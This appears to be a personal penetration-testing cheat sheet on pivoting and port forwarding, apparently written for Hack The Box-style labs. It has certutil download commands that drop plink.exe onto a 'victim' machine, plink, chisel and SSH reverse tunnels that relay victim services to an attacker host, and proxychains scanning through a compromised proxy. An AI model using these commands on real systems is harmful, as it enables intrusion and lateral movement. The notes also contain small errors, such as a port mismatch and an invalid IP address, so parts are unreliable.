- [Windows](#Windows)
    - [plink](#plink)
    - [chisel](#chisel)
    
- [Linux](#Linux)
    - [SSH Tunneling](#SSH-Tunneling)
    - [ncat port forwarding](#ncat-port-forwarding)
    - [RINETD](#RINETD)
    
# Windows

- edit /etc/ssh/sshd_config
```
uncomment PermitRootLogin and set as yes
```

#### plink
- Download Plink.exe file

- Put plink on victim windows machine
```
certutil -urlcache -f http://[your_ip]/plink.exe plink.exe
```

- run plink on on windows machine 
plink.exe -l root -pw <pass> -R 445:127.0.0.1:445 <your_linux_ip>
  
  
#### chisel
- Download chisel
https://github.com/jpillora/chisel/releases/tag/v1.7.4


- Run chisel server on your linuxmachine: 
```
./chisel server -p 9999 --reverse -v
```

- Run chisel client on victim windows machine:
```
chisel.exe client <your_linux_ip>:9000 R:widnows_service_port:127.0.0.1:widnows_service_port

e.g:
chisel.exe client 10.10.14.49:9999 R:8888:127.0.0.1:8888
```

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Linux

## SSH Tunneling
  
### SSH Local Port Forwarding
  
In case exploit can not be run locally on target machine, you can frowarded the port via SSH to your local machine
```
ssh [username]@[victim_ip] -L [your_local_port]:127.0.0.1:[victim_service_port] 

ssh [username]@[victim_ip] -R [your_local_port]:127.0.0.1:[victim_service_port] 
```
  
### SSH Remote Port Forwarding
  
### SSH Dynamic Port Forwarding

# TODO!!!

### Proxychains 
#### use squid proxy
- nano /etc/proxychains.conf
#### add:
- http 192.168.213.141 3128

#### scan ports via tunnel
- proxychain nmap -sT -p 22 127.0.0.1

#### ssh login via proxychains
- proxychains ssh name@127.0.0.1

#### use squid proxy
- proxytunnel -p 192.168.0.115:3128 -d 127.0.0.1:22 -a 1234
#### e.g:
- ssh name@127.0.0.1 -p 1234

Exploit code can be run on local machine

#### case study
##### on victim machine
- check service port *netstat -nl*
- ssh -R 4444:127.0.0.1:3306 root@192.168.100.104

##### on yours kali machine
mysql -u root -h 127.0.0.1 -P 4444

#### case study 2 (TightVNC)
```
- check ps -aux
  result: Xvnc :1 -desktop X -httpd /usr/../tightvnc/classes
- check netstat -an
  result: 127.0.0.1.5901
- port forwarding from local machine
  ssh -L 5901:127.0.0.1:5901 username@10.10.10.84
  pass password
- vncviewer 127.0.0.1:5901 -passwd secret_file_with_password
```

#### case study 3 (htb poison vnc)
```
on your machine:
ssh -L 5902:localhost:5901 charix@10.10.10.84
in second window:
vncviewer -passwd secret 127.0.0.1:5902
```

### ncat port forwarding
- ncat -u -l  [port1] -c  'ncat -u -l [port2]'
  - Now all the connections for port [port1] will be forwarded to port [port2]

### RINETD
During an assessment, we gained root access to an Internet-connected Linux web server. From there, we found and compromised a Linux client on an internal network, gaining access to SSH credentials. In this fairly-common scenario, our first target, the Linux web server, has Internet connectivity, but the second machine, the Linux client, does not.
  
- install rinet
```
sudo apt update && sudo apt install rinetd
```
  
- edit rinetd configuration file
```
nano / etc/ rinetd.conf

add line:
# bindadress bindport connectaddress connectport
0.0.0.0 80 216.58.287.142 80
```
This rule states that all traffic received on port 80 of our Kali Linux server, listening on all interfaces (0.0.0.0), regardless of destination address, will be redirected to 216.58.207.142:80. This is exactly what we want.

- Restart rinetd service
```
sudo service rinetd restart
```
